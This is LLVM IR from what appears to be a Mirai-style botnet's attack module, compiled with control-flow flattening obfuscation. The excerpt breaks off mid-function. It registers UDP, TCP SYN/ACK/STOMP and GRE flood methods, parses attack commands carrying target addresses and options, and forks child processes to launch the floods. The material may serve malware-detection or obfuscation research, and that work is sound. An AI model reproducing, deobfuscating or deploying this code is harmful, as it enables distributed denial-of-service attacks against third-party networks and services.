; ModuleID = 'host/ir_fla/Josho.c.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 799955551, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 799955551, label %first
    i32 -1689694943, label %17
    i32 1940137318, label %18
    i32 2932395, label %32
    i32 1770064047, label %33
    i32 1444680836, label %44
    i32 -921943735, label %45
    i32 -1085733288, label %57
    i32 -1467882664, label %58
    i32 -1197060872, label %66
    i32 527333225, label %67
    i32 1166264737, label %72
    i32 -540742196, label %78
    i32 -1213354117, label %120
    i32 1987197330, label %123
    i32 1810944425, label %128
    i32 1184046952, label %129
    i32 -1078081606, label %141
    i32 86899390, label %146
    i32 -1859748241, label %152
    i32 -1257957371, label %157
    i32 -1844318438, label %158
    i32 -1922232043, label %175
    i32 665382025, label %176
    i32 507207842, label %189
    i32 -1502560998, label %190
    i32 643311043, label %219
    i32 2129782913, label %222
    i32 973659791, label %223
    i32 -1720503844, label %231
    i32 -398714055, label %235
    i32 2014019173, label %238
    i32 -1042309774, label %242
    i32 -823763741, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 -1689694943, i32 1940137318
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 2932395, i32 1770064047
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 1444680836, i32 -921943735
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -1085733288, i32 -1467882664
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -1197060872, i32 527333225
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 1166264737, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 -540742196, i32 1987197330
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -1213354117, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 1166264737, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 1810944425, i32 1184046952
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 -1078081606, i32 973659791
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 86899390, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -1859748241, i32 2129782913
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 -1257957371, i32 -1844318438
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 -1922232043, i32 665382025
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 507207842, i32 -1502560998
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 643311043, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 86899390, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 973659791, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 -1720503844, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 -398714055, i32 2014019173
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 2014019173, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 -1042309774, i32 -823763741
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -823763741, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 539984508, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 539984508, label %first
    i32 -2039376835, label %19
    i32 271334976, label %23
    i32 -1882680110, label %24
    i32 380777326, label %25
    i32 1820946958, label %31
    i32 -1833141777, label %44
    i32 1318554350, label %57
    i32 2113265804, label %58
    i32 -972391701, label %61
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp sgt i32 %.reload, 0
  %18 = select i1 %17, i32 271334976, i32 -2039376835
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %13, align 4
  %21 = icmp eq i32 %20, -1
  %22 = select i1 %21, i32 271334976, i32 -1882680110
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

; <label>:24:                                     ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  store i32 380777326, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %14, align 4
  %27 = load i8, i8* @methods_len, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp slt i32 %26, %28
  %30 = select i1 %29, i32 1820946958, i32 -972391701
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i32, i32* %14, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %34
  %36 = load %struct.attack_method*, %struct.attack_method** %35, align 8
  %37 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %36, i32 0, i32 1
  %38 = load i8, i8* %37, align 8
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* %8, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %39, %41
  %43 = select i1 %42, i32 -1833141777, i32 1318554350
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %45, i64 %47
  %49 = load %struct.attack_method*, %struct.attack_method** %48, align 8
  %50 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %49, i32 0, i32 0
  %51 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %50, align 8
  %52 = load i32, i32* %7, align 4
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %55 = load i8, i8* %11, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %51(i32 %52, i8 zeroext %53, %struct.attack_target* %54, i8 zeroext %55, %struct.attack_option* %56)
  store i32 -972391701, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 2113265804, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %14, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %14, align 4
  store i32 380777326, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %58, %57, %44, %31, %25, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 1051084349, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1051084349, label %first
    i32 -1561026357, label %9
    i32 247169992, label %10
    i32 1585009224, label %11
    i32 1188781966, label %16
    i32 -1196104463, label %25
    i32 -675760090, label %32
    i32 956935264, label %33
    i32 -1218312219, label %36
    i32 1269742497, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 -1561026357, i32 247169992
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 1269742497, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1585009224, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 1188781966, i32 -1218312219
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 -1196104463, i32 -675760090
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 -675760090, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 956935264, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 1585009224, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 1269742497, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
